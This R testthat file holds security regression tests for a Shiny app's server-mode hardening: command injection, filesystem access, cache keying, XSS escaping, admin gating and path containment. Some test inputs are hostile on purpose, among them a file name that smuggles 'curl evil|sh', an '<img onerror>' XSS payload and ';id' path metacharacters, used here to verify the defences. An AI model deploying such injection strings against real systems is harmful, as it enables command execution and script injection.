# tests/testthat/test-server-mode-hardening.R
# Red->green anchors for review 2026-10-07 batch 2 (docs/code-review-2026-10-07.md):
#   N9/N10  recent_projects observers reachable in server mode (command injection
#           via unquoted system2 + arbitrary-directory list/load/delete)
#   N12     Settings > SES Models custom directory browses the server filesystem
#   N13     process-global .ses_models_cache not keyed by directory
#   N15     Decision Lens narrative interpolates an unescaped label into HTML()
#   N18     feedback_admin mark_dup/find_duplicates/recalculate lack the admin gate
#   N19     feedback_admin admin tables render Title/Description with escape=FALSE
#   N56     autosave-path containment uses bare startsWith (no trailing separator)
source_for_test(c("modules/recent_projects_module.R",
                  "modules/feedback_admin_module.R",
                  "functions/persistent_storage.R",
                  "functions/ses_models_loader.R",
                  "functions/decision_lens.R",
                  "functions/feedback_analyzer.R",
                  "functions/utils.R"))
recent_projects_server <- get("recent_projects_server", envir = .GlobalEnv)
feedback_admin_server  <- get("feedback_admin_server",  envir = .GlobalEnv)
i18n_echo <- list(t = function(key, ...) key)

# Temporarily rebind functions in .GlobalEnv (where the sourced modules resolve
# them) and restore afterwards. Used to force deployment mode and keep the
# module away from the real storage config in the user's HOME.
with_global_mocks <- function(mocks, code) {
  old <- lapply(names(mocks), function(n)
    if (exists(n, envir = .GlobalEnv, inherits = FALSE)) get(n, envir = .GlobalEnv) else NULL)
  names(old) <- names(mocks)
  for (n in names(mocks)) assign(n, mocks[[n]], envir = .GlobalEnv)
  on.exit({
    for (n in names(old)) {
      if (is.null(old[[n]])) rm(list = n, envir = .GlobalEnv) else assign(n, old[[n]], envir = .GlobalEnv)
    }
  }, add = TRUE)
  force(code)
}

recent_projects_mocks <- function(mode, config_file, calls) {
  list(
    detect_deployment_mode        = function() mode,
    is_storage_configured         = function() FALSE,
    get_suggested_projects_folder = function() NULL,
    get_projects_folder           = function(...) NULL,
    get_storage_config_path       = function() config_file,
    system2    = function(command, args = character(), ...) { calls$n <- calls$n + 1L; calls$last <- list(command, args); invisible(0L) },
    shell.exec = function(file) { calls$n <- calls$n + 1L; calls$last <- list("shell.exec", file); invisible(NULL) }
  )
}

# ---------------------------------------------------------------------------
# N9 / N10 — recent_projects in server mode
# ---------------------------------------------------------------------------
test_that("N10: in server mode the folder/delete/open observers are inert (no adoption, no deletion, no shell)", {
  folder <- file.path(tempfile("rp_"), "x;id")   # metacharacter in the path on purpose
  dir.create(folder, recursive = TRUE)
  sentinel <- file.path(folder, "victim.rds"); saveRDS(list(a = 1), sentinel)
  calls <- new.env(); calls$n <- 0L
  with_global_mocks(recent_projects_mocks("server", tempfile(fileext = ".rds"), calls), {
    testServer(recent_projects_server,
               args = list(project_data_reactive = shiny::reactiveVal(NULL), i18n = i18n_echo), {
      session$flushReact()
      session$setInputs(custom_folder_path = folder)
      session$setInputs(save_custom_folder = 1)
      expect_equal(nrow(session$getReturned()$get_projects()), 0)   # folder NOT adopted
      session$setInputs(do_delete = 1)
      session$setInputs(open_folder = 1)
      session$setInputs(refresh_list = 1)
      expect_equal(nrow(session$getReturned()$get_projects()), 0)
    })
  })
  expect_true(file.exists(sentinel))      # nothing deleted
  expect_equal(calls$n, 0L)               # no shell command spawned
})

test_that("N10 control: in local mode the same sequence adopts the folder and lists the project", {
  folder <- tempfile("rp_local_"); dir.create(folder, recursive = TRUE)
  saveRDS(list(a = 1), file.path(folder, "mine.rds"))
  calls <- new.env(); calls$n <- 0L
  with_global_mocks(recent_projects_mocks("local", tempfile(fileext = ".rds"), calls), {
    testServer(recent_projects_server,
               args = list(project_data_reactive = shiny::reactiveVal(NULL), i18n = i18n_echo), {
      session$flushReact()
      session$setInputs(custom_folder_path = folder)
      session$setInputs(save_custom_folder = 1)
      expect_equal(nrow(session$getReturned()$get_projects()), 1)
    })
  })
})

test_that("N9: the open-folder command quotes the path for the shell on Unix and uses shell.exec on Windows", {
  f <- "/tmp/x;curl evil|sh"
  u <- open_folder_command(f, os_type = "unix", sysname = "Linux")
  expect_equal(u$fn, "xdg-open")
  expect_equal(u$args, shQuote(f))
  m <- open_folder_command(f, os_type = "unix", sysname = "Darwin")
  expect_equal(m$fn, "open")
  expect_equal(m$args, shQuote(f))
  w <- open_folder_command("C:/Users/me/Projects", os_type = "windows", sysname = "Windows")
  expect_equal(w$fn, "shell.exec")
})

# ---------------------------------------------------------------------------
# N12 — SES Models custom directory is refused in server mode
# ---------------------------------------------------------------------------
test_that("N12: resolve_ses_models_custom_dir refuses any custom directory in server mode", {
  d <- tempfile("models_"); dir.create(d)
  r <- resolve_ses_models_custom_dir(d, deployment_mode = "server")
  expect_false(r$ok)
  expect_equal(r$reason, "server_mode")

  r2 <- resolve_ses_models_custom_dir(d, deployment_mode = "local")
  expect_true(r2$ok)
  expect_equal(r2$path, normalizePath(d, winslash = "/"))

  r3 <- resolve_ses_models_custom_dir(file.path(d, "does-not-exist"), deployment_mode = "local")
  expect_false(r3$ok)
  expect_equal(r3$reason, "not_found")
})

# ---------------------------------------------------------------------------
# N13 — models cache keyed by directory
# ---------------------------------------------------------------------------
test_that("N13: a cached scan of directory A is not served for directory B", {
  skip_if_not_installed("openxlsx")
  a <- tempfile("sesA_"); b <- tempfile("sesB_"); dir.create(a); dir.create(b)
  openxlsx::write.xlsx(data.frame(x = 1), file.path(a, "alpha_model.xlsx"))
  openxlsx::write.xlsx(data.frame(x = 1), file.path(b, "bravo_model.xlsx"))
  invalidate_ses_models_cache()
  ra <- scan_ses_models(a, use_cache = FALSE)
  rb <- scan_ses_models(b, use_cache = TRUE)      # within the 60 s TTL
  names_a <- unlist(lapply(ra, function(g) vapply(g, function(m) m$display_name, character(1))))
  names_b <- unlist(lapply(rb, function(g) vapply(g, function(m) m$display_name, character(1))))
  expect_true("alpha_model" %in% names_a)
  expect_true("bravo_model" %in% names_b)
  expect_false("alpha_model" %in% names_b)
  # and the cache still serves repeat scans of the SAME directory
  rb2 <- scan_ses_models(b, use_cache = TRUE)
  expect_identical(rb2, rb)
  invalidate_ses_models_cache()
})

# ---------------------------------------------------------------------------
# N15 — Decision Lens narrative escapes the label
# ---------------------------------------------------------------------------
test_that("N15: build_decision_narrative HTML-escapes the element label", {
  micmac <- data.frame(id = "D_1", label = "Cod <img src=x onerror=alert(1)>",
                       quadrant = "Influential", stringsAsFactors = FALSE)
  html <- build_decision_narrative("D_1", micmac, loop_info = NULL,
                                   archetypes = list(), i18n = i18n_echo)
  expect_false(grepl("<img", html, fixed = TRUE))
  expect_true(grepl("&lt;img", html, fixed = TRUE))
})

# ---------------------------------------------------------------------------
# N18 — feedback admin endpoints are gated
# ---------------------------------------------------------------------------
test_that("N18: mark_dup does nothing for a non-admin session", {
  tmp <- tempfile(fileext = ".ndjson")
  writeLines(c(
    '{"timestamp":"2026-10-01T10:00:00Z","type":"bug","title":"one","description":"d1","status":"open","github_url":"NA"}',
    '{"timestamp":"2026-10-02T10:00:00Z","type":"bug","title":"two","description":"d2","status":"open","github_url":"NA"}'
  ), tmp)
  before <- readLines(tmp)
  withr::with_options(list(marinesabres.feedback_log_path = tmp), {
    testServer(feedback_admin_server, args = list(i18n = i18n_echo, admin = FALSE), {
      # mark_dup uses ignoreInit = TRUE: in testServer the first setInputs is
      # consumed as the init event, so fire twice to reach the handler.
      session$setInputs(mark_dup = list(line = 2, dup_of = 1, rand = 0.1))
      session$setInputs(mark_dup = list(line = 2, dup_of = 1, rand = 0.2))
      session$setInputs(find_duplicates = 1)
      session$setInputs(recalculate = 1)
    })
  })
  expect_identical(readLines(tmp), before)
})

test_that("N18 control: the same mark_dup input DOES rewrite the log for an admin session", {
  tmp <- tempfile(fileext = ".ndjson")
  writeLines(c(
    '{"timestamp":"2026-10-01T10:00:00Z","type":"bug","title":"one","description":"d1","status":"open","github_url":"NA"}',
    '{"timestamp":"2026-10-02T10:00:00Z","type":"bug","title":"two","description":"d2","status":"open","github_url":"NA"}'
  ), tmp)
  before <- readLines(tmp)
  withr::with_options(list(marinesabres.feedback_log_path = tmp), {
    testServer(feedback_admin_server, args = list(i18n = i18n_echo, admin = TRUE), {
      # mark_dup uses ignoreInit = TRUE: in testServer the first setInputs is
      # consumed as the init event, so fire twice to reach the handler.
      session$setInputs(mark_dup = list(line = 2, dup_of = 1, rand = 0.1))
      session$setInputs(mark_dup = list(line = 2, dup_of = 1, rand = 0.2))
    })
  })
  after <- readLines(tmp)
  expect_false(identical(after, before))
  expect_true(any(grepl("duplicate", after[2], fixed = TRUE)))
})

# ---------------------------------------------------------------------------
# N19 — admin tables escape user text
# ---------------------------------------------------------------------------
test_that("N19: escape_feedback_display_cols escapes only the user-text columns", {
  disp <- data.frame(Title = "<b>x</b>", Description = "a & b",
                     GitHub = '<a href="https://x">ok</a>', stringsAsFactors = FALSE)
  out <- escape_feedback_display_cols(disp, c("Title", "Description"))
  expect_equal(out$Title, "&lt;b&gt;x&lt;/b&gt;")
  expect_equal(out$Description, "a &amp; b")
  expect_equal(out$GitHub, disp$GitHub)
})

# ---------------------------------------------------------------------------
# N56 — containment requires a path separator after the root
# ---------------------------------------------------------------------------
test_that("N56: path_is_within_root rejects sibling directories that merely share the root prefix", {
  expect_true(path_is_within_root("/srv/app/.autosave/x.rds", "/srv/app/.autosave"))
  expect_true(path_is_within_root("/srv/app/.autosave/", "/srv/app/.autosave"))
  expect_false(path_is_within_root("/srv/app/.autosave-evil/x.rds", "/srv/app/.autosave"))
  expect_false(path_is_within_root("/srv/app/.autosaveX", "/srv/app/.autosave"))
  expect_false(path_is_within_root("/srv/other/x.rds", "/srv/app/.autosave"))
  expect_false(path_is_within_root("/srv/app/.autosave/x.rds", NA_character_))
})
